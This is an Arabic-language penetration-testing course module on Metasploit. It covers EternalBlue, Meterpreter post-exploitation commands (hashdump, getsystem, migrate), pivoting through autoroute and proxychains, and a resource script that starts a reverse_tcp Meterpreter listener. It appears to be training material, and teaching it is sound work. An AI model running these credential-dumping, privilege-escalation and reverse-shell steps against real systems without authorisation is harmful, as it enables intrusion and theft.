Exploit Frameworks وُجدت لحل مشكلة حقيقية: الـ Exploits الخام متفرّقة وبتحتاج تعديل ثقيل لكل هدف، والـ Post-Exploitation يحتاج جمع أدوات كثيرة. MSF حلَّت كل ده في Console واحد.

أنواع موديولات Metasploit

📌 تاريخ MSF

أسَّسه H.D. Moore عام 2003 كلعبة شبكية — تطوَّر بسرعة ليصبح Framework الاختراق الأوسع انتشاراً. MS17-010 EternalBlue — الاستغلال الكلاسيكي

⚙ CVE-2017-0144 — EternalBlue

SMBv1 Buffer Overflow في Windows — مسرَّب من NSA (Shadow Brokers). يصيب: XP, Vista, 7, 8.1, Server 2003-2016 (غير مُرقَّع). استُخدم في WannaCry وNotPetya. النتيجة: SYSTEM shell — أعلى امتيازات Windows.

04Payloads ومsfvenom — Staged vs Non-Staged وMeterpreter

Staged vs Non-Staged — الفرق الجوهري

النقطة: slash (/) = Staged | underscore (_) في meterpreter = Non-Staged — قرار مهم يحدَّد بحجم الـ Buffer

Meterpreter — أقوى Payload

⬦ Meterpreter

بيشتغل في الذاكرة فقط — لا ملف على القرص. الاتصال مُشفَّر (AES-256 للـ HTTPS). قابل للتوسيع وقت التشغيل بدون Exploits جديدة. متعدد المنصات: Windows, Linux, macOS, Android.

الأمرالوظيفة
sysinfoمعلومات النظام — OS, Hostname, Architecture, Language
getuidالمستخدم الحالي (قبل وبعد رفع الامتيازات)
getpidPID عملية Meterpreter الحالية
psكل العمليات الجارية مع PID والمستخدم والمسار
migrate <PID>نقل Meterpreter لعملية أخرى
getsystemمحاولة رفع الامتيازات تلقائياً لـ SYSTEM
hashdumpتفريغ هاشات SAM (يحتاج SYSTEM)
idletimeوقت خمول المستخدم — قبل تشغيل عمليات واضحة
execute -f notepad.exe -Hتشغيل عملية جديدة بنافذة مخفية للـ Migration
download <file>تنزيل ملف من الهدف
upload <file>رفع ملف للهدف
shellفتح OS Shell تفاعلي

06Pivoting — Routes وSOCKS وPort Forwarding

Pivoting — المفهوم

Pivoting = استخدام جهاز مخترَق كبوابة للوصول لشبكات جديدة. الجهاز الأولي غالبًا بيملك واجهتين — WAN وLAN داخلي. بدون Pivoting: المهاجم لا يرى الشبكة الداخلية. مع Pivoting: الترافيك يُوجَّه عبر الجهاز المخترَق بشكل شفاف.

Pivot Host بيربط WAN بالشبكة الداخلية — Meterpreter Session هو القناة

Routes — Pivoting داخل MSF

meterpreter + msfconsole — routes
# من داخل Meterpreter Session:
ipconfig
# eth1: 10.10.10.0/24 ← الشبكة الداخلية

background

# الطريقة 1 — Route يدوي
route add 10.10.10.0/24 1   # 1 = Session ID
route print

# الطريقة 2 — autoroute (الأفضل)
use post/multi/manage/autoroute
set SESSION 1
run
# [+] Route added to subnet 10.10.10.0/255.255.255.0 via session 1
# [+] All subnets auto-discovered!

# الآن MSF Modules تعمل على الشبكة الداخلية
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445,3389
run
# ⚠ Nmap خارج MSF لا يعمل عبر MSF Routes!

SOCKS Proxy — Pivoting لكل الأدوات

MSF Routes تعمل فقط مع MSF Modules. SOCKS Proxy بيسمح لـ Nmap وSmbclient وBrowser وكل شيء بالـ Pivot.

# آخر سطر: socks5 127.0.0.1 9050

proxychains nmap -sT -Pn 10.10.10.5
proxychains smbclient //10.10.10.10/share
proxychains ssh user@10.10.10.5
proxychains evil-winrm -i 10.10.10.1 -u admin -p Pass

07Automation — Resource Scripts وأمن العمليات

Resource Scripts — الأتمتة

Resource Scripts بتحتوي تسلسلاً من أوامر MSFconsole يُنفَّذ تلقائياً. تستطيع أيضاً تضمين Ruby Code للمنطق الشرطي. تُشغَّل عند البدء بـ -r flag أو من داخل MSF بـ resource.

bash — listener.rc
# listener.rc — Handler آلي كامل
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.118.4
set LPORT 4444
# Auto-migrate فور فتح الـ Session
set AutoRunScript post/windows/manage/migrate
# البقاء مفتوحاً لاتصالات متعددة
set ExitOnSession false
# تشغيل كـ Background Job
exploit -j
# Listener شغّال في الخلفية!

# ===== تشغيل الـ Script =====
# عند البدء:
sudo msfconsole -r listener.rc

# من داخل MSF:
resource /path/to/listener.rc

# Built-in scripts:
ls /usr/share/metasploit-framework/scripts/resource/

الخلاصة العامة للموديول

الموديول ده غطّى Metasploit Framework من الألف للياء — من إعداد الـ DB وتنظيم الـ Workspaces، للاستكشاف بـ Auxiliary Modules، للاستغلال بـ Exploit Modules، لتوليد الـ Payloads بـ msfvenom، لـ Post-Exploitation وكسر بيانات الاعتماد بـ Kiwi، والتنقّل داخل الشبكة بـ Pivoting.

$ cat ./module18_summary.txt
  • MSF منظَّم في 6 أنواع موديولات: auxiliary, exploit, payload, post, encoder, nop
  • PostgreSQL وWorkspaces ضروريان لتنظيم وعزل بيانات كل Engagement
  • Auxiliary Modules للـ Recon وهجمات Credentials بدون استغلال ثغرات
  • Exploit Rank: Excellent أولاً — Low و Manual بحذر شديد وفي Lab أولاً
  • Staged (/) = أصغر وأخفت | Non-Staged (_) = أكثر استقراراً — الاختيار يعتمد على Buffer Size
  • Meterpreter = أقوى Payload: في الذاكرة، مُشفَّر، موسَّع، متعدد المنصات
  • msfvenom يولَّد Payloads بكل الصيغ (exe, elf, ps1, aspx, dll, apk)
  • بعد Session: getuid → getsystem → migrate → creds_all (Kiwi) — هذا الترتيب الصحيح
  • Pivoting: Routes للـ MSF Modules فقط | SOCKS+Proxychains لكل الأدوات | Port Forward لخدمة محدَّدة
  • Resource Scripts تُلغي التكرار — listener.rc مع AutoRunScript يعمل تلقائياً كاملاً

MSF مش مجرد أداة — هو بيئة عمل كاملة. المختبر الذي يفهم كيف يربط Auxiliary بـ Exploit بـ Post بـ Pivot في Console واحد، يتحوَّل من مهاجم تكتيكي لمهاجم استراتيجي قادر على خرق شبكات كاملة بمنهجية.

★ Professional Mindset

ابدأ دايماً بـ workspace -a <client> → db_nmap → auxiliary للاستكشاف → exploit بالـ Rank الأعلى → فور الـ Session: migrate، getsystem، creds_all → autoroute → SOCKS → lateral. كل خطوة منظَّمة في الـ DB — لا تبدأ من جديد في كل Engagement.
